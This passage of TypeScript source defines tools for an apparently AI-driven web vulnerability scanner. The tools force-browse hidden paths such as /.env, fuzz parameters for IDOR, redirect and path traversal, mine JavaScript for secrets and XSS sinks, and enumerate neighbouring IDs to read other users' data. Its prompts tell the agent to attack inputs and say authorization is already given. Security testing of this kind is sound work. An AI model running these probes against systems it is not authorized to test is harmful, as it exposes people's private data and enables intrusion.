          if (!idorContentProven) {
            const verdict = checkEvidenceDiscipline(
              { status: negRec.response.status, bodyLen: negRec.response.body.length },
              posRecs.map((r) => ({ status: r!.response.status, bodyLen: r!.response.body.length })),
            );
            if (!verdict.ok)
              return txt(`REJECTED (evidence discipline): ${verdict.reason}. Get a negative control that fails + >=2 stable positive replays, then record.`);
          }
        }
        const evidenceIds = [...new Set([negativeControl, ...positiveReplays])];
        return txt(await commit("confirmed", evidenceIds));
      },
    ),
    tool(
      "screen_done",
      "Finish diagnosing the current screen. You MUST account for EVERY class the plan named: pass `coverage` with one entry per planned class — result 'found' (confirmed + recorded), 'suspected' (you saw a real anomaly but couldn't fully confirm — record_finding it as verdict:suspected), 'tested-clean' (actively probed, held), or 'not-applicable' (concrete reason it can't apply). Finding ONE hole does NOT let you skip the rest of the plan. verdict 'finding' if >=1 confirmed, 'suspected' if only suspected leads, else 'clean'.",
      {
        verdict: z.enum(["finding", "suspected", "clean"]),
        coverage: z
          .array(z.object({ class: z.string(), result: z.enum(["found", "suspected", "tested-clean", "not-applicable"]), note: z.string().optional() }))
          .optional()
          .describe("one entry per planned attack class (from get_screen.plannedClasses)"),
        note: z.string().optional(),
      },
      async ({ verdict, coverage, note }) => {
        // ── カバレッジ・ゲート ── プランが挙げた攻撃クラスを全部 coverage で説明できるまで画面を閉じさせない。
        //   「1個見つけて screen_done」を構造的に封じる(non-terminal nudge: screenDone は立てずに差し戻す)。
        const planned = plannedClassesFor(s.plans.get(s.currentScreenId ?? ""));
        const gate = checkScreenCoverage(planned, coverage ?? [], s.screenProbes);
        if (!gate.ok) return txt(`NOT DONE — ${gate.reason}`);
        // Input-surface floor: a screen the plan left with NO active class (hygiene-only plan) but that actually carries
        // a form/params/API must still get >=1 ACTIVE probe before closing — otherwise "static-looking" postback pages
        // (ASP.NET/SharePoint forms) close on header checks alone and their real surface is never attacked. screenProbes
        // counts active probes only (probe_headers is active:false), so ===0 here means "mapped but never attacked".
        // Truly static leaves (no params/apis) stay exempt; skip_screen is the escape hatch for a genuinely untestable one.
        if (planned.length === 0 && s.screenProbes === 0) {
          const sc = s.inv.screens().find((x) => x.screenId === s.currentScreenId);
          if (sc && (sc.params.length > 0 || sc.apis.length > 0))
            return txt(
              `NOT DONE — ${s.currentScreenId} carries ${sc.params.length} parameter(s) / ${sc.apis.length} API(s) but only passive/header checks ran (no active probe fired). Attack its input with at least one real probe (probe_params / probe_sqli / probe_ssrf / probe_idor / probe_redirect, or http_request with a crafted value) before closing — or skip_screen with a concrete reason if it genuinely has no testable surface.`,
            );
        }
        // screenVerdict は record_finding が維持する(commit、upgrade-only)。モデルの自己申告 verdict では上書きしない
        //   — 記録された実体(confirmed/suspected/無し)が screen status の権威。verdict はログ/返却にのみ使う。
        s.screenDone = true;
        const covSummary = coverage?.length ? ` [${coverage.map((c) => `${coarseClass(c.class)}:${c.result}`).join(", ")}]` : "";
        s.store.appendEvent(s.assessmentId, {
          type: "note",
          payload: { message: `✓ ${s.currentScreenId} → ${verdict}${covSummary}${note ? ` — ${note.slice(0, 160)}` : ""}` },
        });
        return txt(`screen ${s.currentScreenId} → ${verdict}${covSummary}`);
      },
    ),
    tool(
      "skip_screen",
      "Flag the CURRENT screen as excluded and move on WITHOUT firing its attack — reserve this for a screen whose ONLY meaningful action would actively MOVE REAL MONEY or MUTATE / DESTROY real production state on a live third party (submitting a tampered or real payment / transfer request, a fund movement, a mass-delete). READING / RETRIEVAL IS NOT A REASON TO SKIP — IDOR-READ, cross-user data access, and PII / financial-data DISCLOSURE are IN scope; test those normally and record_finding the exposure. It records the screen as EXCLUDED with your reason (flagged for manual / authorized review) and CONTINUES to the next screen. Use this INSTEAD of `done` (which halts the ENTIRE assessment) and INSTEAD of fabricating a 'clean' verdict. The operator already asserted target authorization by scoping the run — use this only for a genuinely money-moving / state-destroying screen, not to skip ordinary work (incl. read-only data-exposure testing).",
      { reason: z.string() },
      async ({ reason }) => {
        s.screenSkipReason = reason;
        s.screenDone = true;
        s.store.appendEvent(s.assessmentId, {
          type: "note",
          payload: { message: `🚩 ${s.currentScreenId} SKIPPED (excluded from active testing — flagged for manual/authorized review): ${reason.slice(0, 240)}` },
        });
        return txt(`screen ${s.currentScreenId} flagged EXCLUDED (skipped active testing, not attacked) and closed. Continue to the next screen.`);
      },
    ),
    // ───────────────────────── 能動探索(A): paths ─────────────────────────
    tool(
      "probe_paths",
      "Forced-browse a built-in wordlist of common/hidden paths within scope (e.g. /status, /admin, /api/profile, /continue, /.env). Finds UNLINKED endpoints that link-following misses; in-scope HTML hits are queued for mapping. Soft-404 baseline is auto-filtered. Optionally pass extra paths.",
      { extra: z.array(z.string()).optional() },
      async ({ extra }) => {
        let base = { status: 404, len: -1 };
        try {
          const r = await s.http.send({ method: "GET", url: new URL(`/veritas-404-${Date.now()}`, s.targetUrl).toString(), headers: authHeaders(s), body: null });
          base = { status: r.status, len: r.body.length };
        } catch {
          /* ignore */
        }
        const list = [...PATH_WORDLIST, ...(extra ?? [])];
        const hits: Array<Record<string, unknown>> = [];
        let skippedLogout = 0;
        for (const path of list) {
          let url: string;
          try {
            url = new URL(path, s.targetUrl).toString();
          } catch {
            continue;
          }
          if (!isInScope(url, s.scope)) continue;
          if (pathIsIgnored(url, s.ignorePaths, s.targetUrl)) continue; // モデルが間引いたパスはプローブしない
          // logout/signout 系は絶対に GET しない(認証セッションを破棄して以降の診断を全滅させるため)。
          if (isSessionDestroyingPath(url)) {
            skippedLogout += 1;
            continue;
          }
          let res: HttpResponse;
          try {
            res = await s.http.send({ method: "GET", url, headers: authHeaders(s), body: null });
          } catch {
            continue;
          }
          if (res.status === 404) continue;
          if (res.status === base.status && Math.abs(res.body.length - base.len) <= 16) continue; // catch-all 除外
          const ct = (res.headers["content-type"] ?? "").split(";")[0] ?? "";
          hits.push({ path, status: res.status, type: ct, len: res.body.length, location: res.headers["location"] });
          if (res.status < 400 && /html/.test(ct) && !s.visited.has(stripHash(url))) s.frontier.add(stripHash(url));
        }
        s.store.appendEvent(s.assessmentId, {
          type: "note",
          payload: { message: `🔍 probe_paths: ${hits.length} hit(s)/${list.length}, frontier=${s.frontier.size}${skippedLogout ? `, skipped ${skippedLogout} logout-path(s)` : ""}` },
        });
        return txt(JSON.stringify({ hits, queuedToFrontier: s.frontier.size, ...(skippedLogout ? { skippedLogoutPaths: skippedLogout } : {}) }));
      },
    ),

    // ───────────────────────── first-party JS recon ─────────────────────────
    tool(
      "analyze_js",
      "Statically analyze a page's FIRST-PARTY JavaScript: fetch its in-scope <script src> bundles and mine each for (1) hidden API endpoints (fetch/axios/XHR / `/api` literals) — new in-scope ones are ENROLLED as screens the diagnosis stage will probe; (2) hardcoded secrets (API keys / tokens / private keys); (3) an exposed source map; (4) DOM-XSS SINK CANDIDATES — dangerous sinks (innerHTML/outerHTML/insertAdjacentHTML/document.write/eval/Function/setTimeout-string/.html()/location/setAttribute) fed by a taint source (location.hash/search, document.referrer, window.name, postMessage, URL/route params). An LLM refines the regex hits into precise candidates with a routeHint. These are LEADS, not findings — each is returned in sinkLeads with a routeHint to confirm at runtime with probe_dom_xss (a DOM-XSS is confirmed only when the payload actually executes in the browser). Hidden endpoints, keys, and sinks live in the bundles, not just the pages link-following clicked — run this on the app root and any SPA/app page early. Deduped by URL (already-analyzed bundles are skipped). Pass the page url (defaults to the current page).",
      { url: z.string().optional() },
      async ({ url }) => {
        let pageUrl = url;
        if (!pageUrl) {
          try {
            pageUrl = s.driver.currentUrl();
          } catch {
            /* no live page */
          }
        }
        pageUrl = pageUrl || s.targetUrl;
        const res = await analyzePageJs(s, pageUrl);
        return txt(
          JSON.stringify({
            ...res,
            hint:
              res.analyzed > 0
                ? `${res.endpointsEnrolled} NEW endpoint screen(s) enrolled from JS (they will be diagnosed). For any secret hit, verify it is live and record_finding(secret-exposure). An exposed source map is itself a finding (info/low).${res.sinkCandidates > 0 ? ` ${res.sinkCandidates} DOM-XSS sink candidate(s) — see sinkLeads: for each, browser_navigate the routeHint (or the sink's page) and run probe_dom_xss(url, param) to confirm the payload EXECUTES; only then record_finding(xss). Do NOT record from the static hit alone.` : ""}`
                : (res.note ?? "nothing new to analyze"),
          }),
        );
      },
    ),
    tool(
      "probe_guesses",
      "Forced-browse a list of URLs/paths YOU predict exist from the app's naming convention — endpoints nothing links to, so link-following and the static probe_paths wordlist both miss them. Each path is GET-navigated in scope: a real page is enrolled as a screen (you get its screenId back); a 404 / error / login-bounce is dropped; an echo/empty page dedupes onto an existing screen (duplicate). GET-ONLY (never submits) and scope-gated. Pass absolute URLs or root-relative paths. Use after get_inventory to extrapolate missing CRUD actions / sibling controllers / admin variants / API resources.",
      { paths: z.array(z.string()) },
      async ({ paths }) => {
        const CAP = 60;
        const list = paths.slice(0, CAP);
        const results: Array<Record<string, unknown>> = [];
        let enrolled = 0;
        for (const p of list) {
          if (s.maxSurveyScreens != null && s.inv.screens().length >= s.maxSurveyScreens) {
            results.push({ path: p, outcome: "cap_reached" });
            continue;
          }
          let url: string;
          try {
            url = new URL(p, s.targetUrl).toString();
          } catch {
            results.push({ path: p, outcome: "bad_url" });
            continue;
          }
          try {
            const r = await enrolByNavigate(s, url);
            if (r.outcome === "enrolled") enrolled += 1;
            results.push({ path: p, outcome: r.outcome, ...(r.screenId ? { screenId: r.screenId } : {}), ...(r.status ? { status: r.status } : {}) });
          } catch (e) {
            results.push({ path: p, outcome: "error", detail: String(e).slice(0, 80) });
          }
        }
        s.store.appendEvent(s.assessmentId, {
          type: "note",
          payload: { message: `🔮 probe_guesses: ${list.length} guessed path(s) → +${enrolled} enrolled${paths.length > CAP ? ` (capped at ${CAP})` : ""}` },
        });
        return txt(JSON.stringify({ enrolled, screensNow: s.inv.screens().length, results, ...(paths.length > CAP ? { truncated: paths.length - CAP } : {}) }));
      },
    ),
    tool(
      "guess_done",
      "Signal the recon-extrapolation pass is complete: you have inferred the URL/naming convention and probed the endpoints you predicted. Pass a one-line note of the convention found and how many new screens it surfaced.",
      { note: z.string().optional() },
      async ({ note }) => {
        s.reconGuessDone = true;
        if (note) s.store.appendEvent(s.assessmentId, { type: "note", payload: { message: `🔮 recon extrapolation done: ${note.slice(0, 300)}` } });
        return txt("recon extrapolation complete");
      },
    ),

    // ───────────────────────── 能動探索(A): params ─────────────────────────
    tool(
      "probe_params",
      "Fuzz a URL with high-signal hidden parameters the app never sent — IDOR (id/userId/...), redirect (to/next/url/... → external marker), debug (debug/admin/...), file (path traversal). Reports params that changed behaviour (redirect/reflection of the marker, traversal signature, or a different response vs baseline). Confirm any hit with evidence discipline before record_finding. Optionally pass extra {param:value}.",
      { url: z.string(), extra: z.record(z.string()).optional() },
      async ({ url, extra }) => {
        if (!isInScope(url, s.scope)) return txt(`BLOCKED: ${url} is out of scope`);
        let base: HttpResponse;
        try {
          base = await s.http.send({ method: "GET", url, headers: authHeaders(s), body: null });
          bumpHttp(s, base.status);
        } catch (e) {
          return txt(`ERROR baseline: ${String(e).slice(0, 150)}`);
        }
        const probes = [
          ...PARAM_PROBES,
          ...Object.entries(extra ?? {}).map(([name, value]) => ({ name, value, kind: "idor" as const })),
        ];
        const interesting: Array<Record<string, unknown>> = [];
        for (const pr of probes) {
          let u: string;
          try {
            const x = new URL(url, s.targetUrl);
            x.searchParams.set(pr.name, pr.value);
            u = x.toString();
          } catch {
            continue;
          }
          if (!isInScope(u, s.scope)) continue;
          let res: HttpResponse;
          try {
            res = await s.http.send({ method: "GET", url: u, headers: authHeaders(s), body: null });
          } catch {
            continue;
          }
          const loc = res.headers["location"] ?? "";
          const reflectsMarker = pr.kind === "redirect" && (loc.includes(OOB_MARKER) || res.body.includes(OOB_MARKER));
          // impact オラクル(baseline anti-ambient 付き): file 専用の正規表現を一般化 — /etc/passwd・秘密・コマンド出力等を拾う。
          const impact = impactOracle(res.body, { baselineBody: base.body });
          const changed = pr.kind !== "redirect" && (res.status !== base.status || Math.abs(res.body.length - base.body.length) > 64);
          if (!reflectsMarker && impact.length === 0 && !changed) continue;
          const ev = s.evidence.record({
            screenId: s.currentScreenId ?? "pilot",
            validator: "claude-pilot",
            kind: "positive_replay",
            request: { method: "GET", url: u, headers: s.http.effectiveHeaders(authHeaders(s)), body: null },
            response: res,
            note: `probe ${pr.name}=${pr.value} (${pr.kind})`,
          });
          interesting.push({
            param: pr.name,
            value: pr.value,
            kind: pr.kind,
            status: res.status,
            location: loc || undefined,
            len: res.body.length,
            signal: reflectsMarker ? "redirect/reflection" : impact.length ? `impact:${impact[0]!.kind}` : "changed-vs-baseline",
            ...(impact.length ? { impact: impact.map((i) => ({ kind: i.kind, marker: i.marker })), effectMarker: impact[0]!.marker } : {}),
            evidenceId: ev.id,
          });
        }
        return txt(JSON.stringify({ baseline: { status: base.status, len: base.body.length }, interesting }));
      },
    ),

    // ───────────────────────── セッション解析(B) ─────────────────────────
    tool(
      "analyze_session",
      "Dump ONE live authenticated request (Cookie + Authorization + Set-Cookie + cookie flags + JWT alg/claims) so YOU can judge whether the session LOOKS weak. Fires a GET at `url` (default: current page / target). Hints (username-as-cookie, alg:none, short plaintext) are leads, not confirmation. JWT Bearer → also probe_jwt. To CONFIRM forgeability, http_request as another identity (invalid forged value must fail). If you cannot swap identity, record_finding(verdict:suspected, category session) citing the returned evidenceId.",
      { url: z.string().optional() },
      async ({ url }) => {
        let pageUrl = url?.trim() || "";
        if (!pageUrl) {
          try {
            pageUrl = s.driver.currentUrl();
          } catch {
            /* no live page */
          }
        }
        if (!pageUrl) pageUrl = s.targetUrl;
        if (!isInScope(pageUrl, s.scope)) return txt(`BLOCKED: ${pageUrl} is out of scope`);
        const cookieHeader = s.currentCookie || "";
        const bearer = s.currentBearer || "";
        const authorization = bearer ? `Bearer ${bearer}` : "";
        if (!cookieHeader && !bearer) return txt("no session: login(role) first (no Cookie, no Bearer).");
        let jar: Array<{ name: string; value: string; httpOnly?: boolean; secure?: boolean; sameSite?: string }> = [];
        try {
          jar = await s.driver.cookies();
        } catch {
          jar = parseCookieHeader(cookieHeader);
        }
        if (jar.length === 0 && cookieHeader) jar = parseCookieHeader(cookieHeader);
        const identities = [s.currentRole, ...[...s.roleCreds.values()].map((c) => c.username)].filter((x): x is string => Boolean(x && x.trim()));
        const cookies = jar.map((c) => glanceCookie(c, identities));
        const req: HttpRequest = { method: "GET", url: pageUrl, headers: authHeaders(s), body: null };
        let res: HttpResponse;
        try {
          res = await s.http.send(req);
          bumpHttp(s, res.status);
        } catch (e) {
          return txt(`ERROR: ${String(e).slice(0, 180)}`);
        }
        const ev = s.evidence.record({
          screenId: s.currentScreenId ?? "pilot",
          validator: "claude-pilot-session",
          kind: "positive_replay",
          request: { ...req, headers: s.http.effectiveHeaders(req.headers) },
          response: res,
          note: "session glance (live authed request for the model to judge)",
        });
        const setCookie = res.headers["set-cookie"] ?? res.headers["Set-Cookie"] ?? "";
        const bearerJwt = bearer ? peekJwt(bearer) : null;
        const hints = [
          ...cookies.flatMap((c) => c.hints.map((h) => `${c.name}: ${h}`)),
          ...(bearerJwt?.unsigned ? [`Bearer JWT alg=${bearerJwt.alg} looks unsigned`] : []),
        ];
        return txt(
          JSON.stringify({
            evidenceId: ev.id,
            currentRole: s.currentRole || "unauth",
            requestDump: formatRequestDump("GET", pageUrl, cookieHeader, authorization),
            response: { status: res.status, setCookie: setCookie || undefined },
            cookies,
            ...(bearerJwt ? { bearerJwt } : {}),
            hints,
            judge:
              "YOU judge this request. Weak-looking session material (username/userid as cookie, sequential id, alg:none / unsigned JWT, session value = the role) is a lead. Confirm forge with http_request as another identity (garbage cookie must fail) → record_finding(session, confirmed). Cannot swap identity this run → record_finding(verdict:suspected, category session, medium+) citing this evidenceId. Do not confirm from the dump alone. Missing HttpOnly on a locale/csrf cookie is not a session finding. JWT in Authorization → also probe_jwt.",
          }),
        );
      },
    ),

    // ── auth-bypass の hybrid ゲート(機械 veto + Claude 判断) ──
    tool(
      "verify_access",
      "Mechanically verify an auth-bypass / broken-access-control claim on an in-scope URL. Fetches it WITHOUT a session and WITH the current session, then returns a verdict: 'not_bypass' = a redirect-to-login / 401 / 403 / login-page body (auth IS working — a HARD veto, do NOT record); 'needs_judgment' = unauth returned 200 & non-login (returns both bodies — confirm only if the unauth body IS the protected content); 'inconclusive' = no session, login(role) first. Records the unauth (negative control) + authed (baseline) as evidence.",
      { url: z.string() },
      async ({ url }) => {
        if (!isInScope(url, s.scope)) return txt(`BLOCKED: ${url} is out of scope`);
        let rUnauth: HttpResponse;
        try {
          rUnauth = await s.http.send({ method: "GET", url, headers: {}, body: null });
          bumpHttp(s, rUnauth.status);
        } catch (e) {
          return txt(`ERROR (unauth): ${String(e).slice(0, 150)}`);
        }
        let rAuth: HttpResponse | null = null;
        if (s.currentCookie || s.currentBearer) {
          try {
            rAuth = await s.http.send({ method: "GET", url, headers: authHeaders(s), body: null });
            bumpHttp(s, rAuth.status);
          } catch {
            rAuth = null;
          }
        }
        const evIds = [
          s.evidence.record({
            screenId: s.currentScreenId ?? "pilot",
            validator: "verify_access",
            kind: "negative_control",
            request: { method: "GET", url, headers: s.http.effectiveHeaders({}), body: null },
            response: rUnauth,
            note: "unauthenticated access attempt",
          }).id,
        ];
        if (rAuth) {
          evIds.push(
            s.evidence.record({
              screenId: s.currentScreenId ?? "pilot",
              validator: "verify_access",
              kind: "positive_replay",
              request: { method: "GET", url, headers: s.http.effectiveHeaders(authHeaders(s)), body: null },
              response: rAuth,
              note: `authenticated baseline as ${s.currentRole || "?"}`,
            }).id,
          );
        }
        const { verdict, reason } = classifyAccess(
          { status: rUnauth.status, location: rUnauth.headers["location"], body: rUnauth.body },
          rAuth ? { status: rAuth.status, body: rAuth.body } : null,
        );
        s.accessVerdicts.set(normEndpoint(url, s.targetUrl), verdict); // record_finding の硬い gate 用
        const gray = verdict === "needs_judgment";
        return txt(
          JSON.stringify({
            verdict,
            reason,
            evidenceIds: evIds,
            unauth: { status: rUnauth.status, len: rUnauth.body.length, ...(gray ? { body: rUnauth.body.slice(0, 1500) } : {}) },
            auth: rAuth ? { status: rAuth.status, len: rAuth.body.length, ...(gray ? { body: rAuth.body.slice(0, 1500) } : {}) } : null,
            ...(gray
              ? { hint: "Confirm auth-bypass ONLY if the unauth body IS the protected data (matches authed / exposes sensitive info). A generic page that merely returns 200 is NOT a bypass." }
              : {}),
          }),
        );
      },
    ),

    tool(
      "probe_idor",
      "Confirm IDOR / BOLA mechanically. As YOUR current session, try to reach ANOTHER user's object. BEST DEFAULT: OMIT param/header/{{ID}} and the tool SWEEPS every id-bearing field on the current screen — each in its OWN location (query/body/header/path), seeded from its observed value + real other-user ids seen elsewhere (knownObjectIds). This is the fix for 'IDOR filed suspected because only one param was tried': one call now covers ALL id fields, so you can't miss the hole by naming the wrong param. `selfId` = an id you legitimately own (OPTIONAL in sweep mode — taken per-field from the inventory). `victimId` = another user's id — OPTIONAL: omit to FUZZ neighbouring ids (selfId±1, ±2, low/seed 1/2/1000) and auto-discover another user's object with no second account. To test ONE specific field, pin it: a {{ID}} placeholder in url/body, `param` (query), or `header` (X-User-Id-style BOLA). Sends a NON-EXISTENT id (negative control — must 404/deny), then the victim/neighbour id (2nd stable replay once it looks real); confirms ONLY on cross-user PRIVATE data (email/phone/address/extra internal id, or order/basket/message contents — NOT a tenant people-picker/profile directory (displayName + work email + photo + tenant is typically intended)) and stable. Opaque uuid/hash ids can't be enumerated → get a real victim id. On a sweep that finds a POPULATED-but-unprovable PRIVATE object it tells you (that is the ONLY case where verdict:suspected is legitimate — a real observed anomaly); a public profile card is CLEAN, not suspected. Returns negativeControl + positiveReplays evidenceIds + cross-user impact → record_finding(category idor, or idor-write for a mutating method).",
      { url: z.string(), selfId: z.string().optional(), victimId: z.string().optional(), param: z.string().optional(), header: z.string().optional(), method: z.string().optional(), body: z.string().optional() },
      async ({ url, selfId, victimId, param, header, method, body }) => {
        type PlaceLoc = IdParamLoc | { via: "body-ph" } | { via: "url-ph" };
        // Place a fuzzed id into ONE location (a specific field), so the same discipline runs across every id-bearing field.
        const buildReqAt = (idVal: string, loc: PlaceLoc): HttpRequest | null => {
          let u = url;
          let b: string | null = body ?? null;
          const h: Record<string, string> = { ...authHeaders(s) };
          switch (loc.via) {
            case "header":
              h[loc.name] = idVal;
              break;
            case "query":
              try {
                const uu = new URL(u);
                uu.searchParams.set(loc.name, idVal);
                u = uu.toString();
              } catch {
                return null;
              }
              break;
            case "body-field":
              b = setFormField(b, loc.name, idVal);
              break;
            case "body-ph":
              if (b == null || !b.includes("{{ID}}")) return null;
              b = b.replace(/\{\{ID\}\}/g, idVal);
              break;
            case "url-ph":
              if (!u.includes("{{ID}}")) return null;
              u = u.replace(/\{\{ID\}\}/g, idVal);
              break;
            case "path": {
              const r = replacePathSeg(u, loc.example, idVal);
              if (!r) return null;
              u = r;
              break;
            }
          }
          if (!isInScope(u, s.scope)) return null;
          return { method: (method ?? (b != null ? "POST" : "GET")).toUpperCase(), url: u, headers: h, body: b };
        };
        const send = async (idVal: string, kind: "negative_control" | "positive_replay", tag: string, loc: PlaceLoc) => {
          const req = buildReqAt(idVal, loc);
          if (!req) return null;
          const res = await s.http.send(req);
          bumpHttp(s, res.status);
          const ev = s.evidence.record({ screenId: s.currentScreenId ?? "pilot", validator: "claude-pilot-idor", kind, request: { ...req, headers: s.http.effectiveHeaders(req.headers) }, response: res, note: `idor ${tag}` });
          return { evId: ev.id, status: res.status, len: res.body.length, body: res.body };
        };
        type Sent = NonNullable<Awaited<ReturnType<typeof send>>>;
        // Evaluate one candidate victim/neighbour id against a shared control: cross-user object present + control (a
        // non-existent id) denied + stable x2. `self` = the id this session legitimately owns (for the impact oracle).
        const evalVictim = async (vid: string, ctrl: Sent, label: string, loc: PlaceLoc, self: string) => {
          const p1 = await send(vid, "positive_replay", `${label} #1`, loc);
          if (!p1) return null;
          const accessible = p1.status < 400;
          const impact = impactOracle(p1.body, { requestedIdentity: vid, sessionIdentity: self, baselineBody: ctrl.body });
          const bodyClass = classifyCrossUserBody(p1.body, vid);
          // Trust the oracle (victim id + not a public-directory card). Do not fall back to a bare identityAppears —
          // that is what confirmed display-name-only profiles as IDOR.
          const crossUser = impact.some((i) => i.kind === "cross-user");
          const publicDirectory = bodyClass.class === "public-directory" && identityAppears(p1.body, vid) && (!self || !identityAppears(p1.body, self));
          const controlDenied = ctrl.status >= 400 || Math.abs(ctrl.len - p1.len) > 64 || !ctrl.body.includes(vid);
          let p2: Sent | null = null;
          let stable = false;
          if (accessible && crossUser && controlDenied) {
            p2 = await send(vid, "positive_replay", `${label} #2`, loc);
            stable = !!p2 && Math.abs(p1.len - p2.len) <= 64 && p1.status === p2.status;
          }
          return { vid, p1, p2, confirmed: accessible && crossUser && controlDenied && stable, accessible, crossUser, publicDirectory, controlDenied, stable, impact, bodyClass: bodyClass.class };
        };
        const cat = (method ?? "GET").toUpperCase() === "GET" ? "idor" : "idor-write";
        // Where the caller pinned the id (single-field mode). null → SWEEP every id-bearing field on the screen.
        const explicitLoc: PlaceLoc | null = header
          ? { via: "header", name: header }
          : body != null && body.includes("{{ID}}")
            ? { via: "body-ph" }
            : param
              ? { via: "query", name: param }
              : url.includes("{{ID}}")
                ? { via: "url-ph" }
                : null;
        try {
          // ── Explicit victim id ── (a second account / a known other-user id was supplied)
          if (explicitLoc && victimId) {
            const self = selfId ?? "";
            const ctrl = await send(nonexistentIdLike(victimId), "negative_control", "non-existent id", explicitLoc);
            if (!ctrl) return txt("ERROR: could not place the id — pass a {{ID}} in url/body, or a param, or a header.");
            const r = await evalVictim(victimId, ctrl, "victim id", explicitLoc, self);
            if (!r) return txt("ERROR: victim request failed to build.");
            return txt(
              JSON.stringify({
                mode: "victim",
                negativeControl: ctrl.evId,
                positiveReplays: [r.p1.evId, ...(r.p2 ? [r.p2.evId] : [])],
                ...(r.impact.length ? { impact: r.impact.map((i) => ({ kind: i.kind, marker: i.marker })) } : {}),
                observed: { control: { status: ctrl.status, len: ctrl.len }, victim: { status: r.p1.status, len: r.p1.len }, crossUser: r.crossUser, controlDenied: r.controlDenied, stable: r.stable },
                verdict: r.confirmed
                  ? `IDOR/BOLA CONFIRMED — your session read victim ${victimId}'s object (status ${r.p1.status}, cross-user data present) while a non-existent id was denied (control status ${ctrl.status}). record_finding(category ${cat}) with these evidenceIds.`
                  : !r.accessible
                    ? `not IDOR: the victim object returned ${r.p1.status} (access control appears to hold).`
                    : !r.crossUser
                      ? r.publicDirectory
                        ? `not IDOR: this looks like a PUBLIC DIRECTORY (${r.bodyClass} — people-picker or store/location locator for ${victimId}). Typically intended — do not record_finding(idor). Mark idor tested-clean. Confirm only if the body also has a person's phone/home address/SSN/DOB, another tenant's data, or a private object (order/hold/document).`
                        : `not confirmed: got ${r.p1.status} but the body does not carry victim ${victimId}'s data (may be your own object, a template, or a catch-all) — verify the id is really another user's.`
                      : !r.controlDenied
                        ? `not confirmed: a NON-EXISTENT id returned the same thing — this endpoint is a catch-all (returns 200 for any id), so a 200 for the victim id proves nothing.`
                        : `not confirmed: victim replays were unstable.`,
              }),
            );
          }
          // ── Explicit single-field ENUMERATION ── a location was pinned but no victim id → walk neighbours of selfId.
          if (explicitLoc) {
            if (!selfId) return txt("ERROR: pass selfId (an id you own) to fuzz its neighbours, or OMIT param/header/{{ID}} to auto-sweep every id-bearing field on the screen.");
            const candidates = idNeighbors(selfId);
            if (candidates.length === 0)
              return txt(
                `ENUMERATION NOT POSSIBLE: '${selfId}' is opaque (uuid/hash) — neighbouring ids can't be walked. Get a real victim id (a second account / knownObjectIds), or if the endpoint clearly exposes an object by id record verdict:"suspected" with the anomaly.`,
              );
            const ctrl = await send(nonexistentIdLike(selfId), "negative_control", "non-existent id", explicitLoc);
            if (!ctrl) return txt("ERROR: could not place the id — pass a {{ID}} in url/body, or a param, or a header.");
            const tried: Array<{ id: string; status: number; len: number; crossUser: boolean; publicDirectory: boolean }> = [];
            for (const vid of candidates) {
              const r = await evalVictim(vid, ctrl, `neighbour ${vid}`, explicitLoc, selfId);
              if (!r) continue;
              tried.push({ id: vid, status: r.p1.status, len: r.p1.len, crossUser: r.crossUser, publicDirectory: r.publicDirectory });
              if (r.confirmed)
                return txt(
                  JSON.stringify({
                    mode: "enumerate",
                    discoveredVictimId: vid,
                    triedIds: candidates,
                    negativeControl: ctrl.evId,
                    positiveReplays: [r.p1.evId, ...(r.p2 ? [r.p2.evId] : [])],
                    ...(r.impact.length ? { impact: r.impact.map((i) => ({ kind: i.kind, marker: i.marker })) } : {}),
                    verdict: `IDOR/BOLA CONFIRMED via id enumeration — neighbour id ${vid} returned another user's object (status ${r.p1.status}, cross-user data) while a non-existent id was denied (control ${ctrl.status}). No second account needed. record_finding(category ${cat}) with these evidenceIds.`,
                  }),
                );
            }
            const distinct = tried.filter((t) => t.status < 400 && Math.abs(t.len - ctrl.len) > 64);
            const directoryHits = distinct.filter((t) => t.publicDirectory);
            const otherHits = distinct.filter((t) => !t.publicDirectory);
            return txt(
              JSON.stringify({
                mode: "enumerate",
                triedIds: candidates,
                observed: tried,
                verdict: otherHits.length
                  ? `not confirmed by fuzzing: ${otherHits.length} neighbour id(s) (${otherHits.map((t) => t.id).join(", ")}) returned a populated 200 but cross-user OWNERSHIP couldn't be auto-proven (the body didn't clearly carry another user's identity). If these are plausibly other users' PRIVATE objects, record verdict:"suspected" citing one of these evidenceIds, or log in as a second role to get a real victim id and re-run.`
                  : directoryHits.length
                    ? `not IDOR: neighbour id(s) (${directoryHits.map((t) => t.id).join(", ")}) returned a PUBLIC DIRECTORY (people-picker or store/location locator — not a person's private object). Typically intended — do not record_finding(idor). Mark idor tested-clean.`
                    : `not confirmed by fuzzing: no neighbour id (${candidates.join(", ")}) returned another user's object — access control appears to hold, or these ids don't map to other users.${ctrl.status < 400 ? " NOTE: the non-existent control also returned 200 → this endpoint may be a catch-all, so id-based tests are inconclusive here." : ""}`,
              }),
            );
          }
          // ── SWEEP mode ── no location pinned → deterministically test EVERY id-bearing field the screen exposes, each
          //    in its OWN location (query/body/header/path), seeded from its observed value + real other-user ids.
          const sc = s.inv.screens().find((x) => x.screenId === s.currentScreenId);
          const fields = idBearingParamLocs(sc?.params ?? []).slice(0, 8);
          if (fields.length === 0)
            return txt(
              `SWEEP NOT POSSIBLE: this screen exposes no id-bearing parameter. Point probe_idor at a specific id — a {{ID}} placeholder in url/body, a query 'param', or a 'header' (e.g. X-User-Id) — with selfId = an id you own.`,
            );
          const known = knownObjectIds(s);
          const victimsFor = (name: string): string[] => known.filter((k) => k.startsWith(`${name}=`)).map((k) => k.slice(name.length + 1)).slice(0, 4);
          const swept: Array<{ param: string; via: string; control?: string; tried: string[]; populated: Array<{ id: string; evId: string; status: number }>; directory?: boolean }> = [];
          for (const f of fields) {
            const self = f.example;
            const victims = [...(victimId ? [victimId] : []), ...victimsFor(f.name)];
            const candidates = [...new Set([...victims, ...idNeighbors(self)])].slice(0, 8);
            if (candidates.length === 0) {
              swept.push({ param: f.name, via: f.loc.via, tried: [], populated: [] });
              continue;
            }
            const ctrl = await send(nonexistentIdLike(self), "negative_control", `non-existent ${f.name}`, f.loc);
            if (!ctrl) {
              swept.push({ param: f.name, via: f.loc.via, tried: [], populated: [] });
              continue;
            }
            const populated: Array<{ id: string; evId: string; status: number }> = [];
            let directory = false;
            for (const vid of candidates) {
              const r = await evalVictim(vid, ctrl, `${f.name}=${vid}`, f.loc, self);
              if (!r) continue;
              if (r.confirmed)
                return txt(
                  JSON.stringify({
                    mode: "sweep",
                    param: f.name,
                    via: f.loc.via,
                    discoveredVictimId: vid,
                    sweptFields: fields.map((x) => `${x.name}(${x.loc.via})`),
                    negativeControl: ctrl.evId,
